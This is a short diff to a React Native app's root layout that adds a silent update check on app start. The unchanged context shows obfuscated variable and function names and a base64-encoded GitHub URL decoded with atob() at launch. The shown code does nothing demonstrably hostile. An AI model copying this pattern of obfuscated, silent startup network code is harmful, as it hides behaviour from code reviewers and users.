@@ -7,6 +7,7 @@ import { View, Text } from 'react-native';
 
 import { useColorScheme } from '@/hooks/use-color-scheme';
 import { SettingsProvider } from '@/contexts/SettingsContext';
+import { checkForUpdates } from '@/services/updateChecker';
 
 export const unstable_settings = {
   anchor: '(tabs)',
@@ -17,6 +18,9 @@ export default function RootLayout() {
   const [pZbxYqLm, qWrTuVnC] = useState(0);
 
   useEffect(() => {
+    // Check for updates silently on app start
+    checkForUpdates(true);
+
     async function aKfDkOjI() {
       try {
         const cBxVnZmA = atob('aHR0cHM6Ly9naXRodWIuY29tL2duaGVuL01pY3JvLVNLVS1BcHA=');
